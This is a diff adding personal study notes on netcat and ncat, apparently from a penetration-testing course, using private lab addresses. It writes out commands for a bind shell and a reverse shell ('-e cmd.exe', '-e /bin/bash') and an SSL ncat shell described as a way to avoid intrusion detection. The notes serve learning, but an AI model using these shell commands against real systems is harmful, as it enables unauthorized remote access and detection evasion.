@@ -1,0 +1,42 @@
+Netcat
+windows 10.0.0.1
+linux 10.0.0.2
+
+use netcat to check if TCP port 110(POP3 mail service) is open on a host
+\\nc -nv 10.0.0.1 110
+
+use netcat as a listener
+\\nc -nlvp 4444
+
+connect to the lister from our attacker machine
+\\nc -nv 10.0.0.1 4444
+
+transfer files between hosts with netcat (from Linux machine to Windows)
+sets up the windows machine to accept any file on 4444 and name it file.exe
+\\nc -nlvp 4444 > file.exe
+
+push the file from linux
+\\nc -nv 10.0.0.1 4444 < /usr/share/windows-binaries/example.exe
+
+netcat bind shell
+from the windows host: binds the cmd exe to port 4444 on the windows host
+\\nc -nlvp 4444 -e cmd.exe
+connect to port 4444 from linux machine and should be presented with cmd prompt
+
+netcat reverse shell
+windows:
+\\nl -nlvp 4444
+
+linux:
+\\nc -nv 10.0.0.1 4444 -e /bin/bash
+
+Ncat allows for the ability to authenticate and encrypt incoming and outgoing connections.
+encryption will help avoid IDS's and allow for authentication on shells
+
+ncat example of a bind shell that is ssl encrupted and will only allow the linux machines IP to connect
+windows:
+\\ncat --exec cmd --allow 10.0.0.2 -vnl 4444 -ssl
+linux
+\\ncat -v 10.0.0.1 4444 -ssl
+
+up to page 50
